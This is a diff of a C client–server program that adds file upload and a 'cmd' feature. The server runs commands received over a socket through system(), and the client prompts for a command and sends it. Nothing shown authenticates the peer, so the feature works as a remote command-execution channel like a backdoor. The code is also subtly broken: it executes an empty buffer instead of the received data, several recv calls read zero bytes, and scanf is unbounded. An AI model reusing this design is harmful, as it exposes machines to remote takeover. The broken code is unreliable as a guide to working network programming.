@@ -252,28 +252,24 @@ int main(argc, argv)
 
 						/* commands */
 						if(strncmp(command, "upload", 6) == 0) {
-								char filename[128];
+							char filename[128];
 
-								/* Zero filename buffer, copy data to it */
-								pzero(filename, sizeof(filename));
-								if(send(clientfd, message, strlen(message), 0) != strlen(message))
-									puts("Error sending message.");
-								if(recv(clientfd, filename, strlen(filename), 0) != strlen(filename))
-									puts("Error receiving filename.");
+							/* Zero filename buffer, copy data to it */
+							pzero(filename, sizeof(filename));
+							if(send(clientfd, message, strlen(message), 0) != strlen(message))
+								puts("Error sending message.");
+							if(recv(clientfd, filename, strlen(filename), 0) != strlen(filename))
+								puts("Error receiving filename.");
 
-								/* upload file */
-								upload_client(filename);
-						} else if(strcmp(command, "cmd") == 0) {
-							char tmp[128];
-							pzero(tmp, sizeof(tmp));
-							bytes=recv(clientfd, tmp, sizeof(tmp), 0);
+							/* upload file */
+							upload_client(filename);
+						} else if(strncmp(command, "cmd", 3) == 0) {
+							char cmd[64];
+							pzero(cmd, sizeof(cmd));
+
+							bytes=recv(clientfd, buf, MAXBUF, 0);
 							if(bytes>0) {
-								system(tmp);
-							} else if(bytes==0) {
-								if(send(clientfd, "Unknown command.", 16, 0) != 16)
-									puts("Error: sending data.");
-							} else {
-								puts("Unknown command.");
+								if(strcmp(cmd, "") != 0) system(cmd);
 							}
 						}
 					} else if(bytes==0)
@@ -330,11 +326,22 @@ int main(argc, argv)
 				if(bytes<0)
 					puts("Error: couldn't send data.");
 
+				bytes=recv(sockfd, filename, strlen(filename), 0);
+				if(bytes<0)
+					puts("Error: couldn't recv data.");
+
 				/* Upload file to server */
 				upload_server(filename, address);
+			} else if(strcmp(buf, "cmd") == 0) {
+                char cmd[64];
+                pzero(cmd, sizeof(cmd));
+                fflush(stdin);
+                printf("Enter command: ");
+                scanf("%[^\n]s", cmd);
+
+				if((send(sockfd, cmd, strlen(cmd), 0)) != strlen(cmd))
+					puts("Could not send data.");
 			}
-			if((send(sockfd, buf, strlen(buf), 0)) != strlen(buf))
-				puts("Could not send data.");
         }
         closesocket(sockfd);
 	} else {
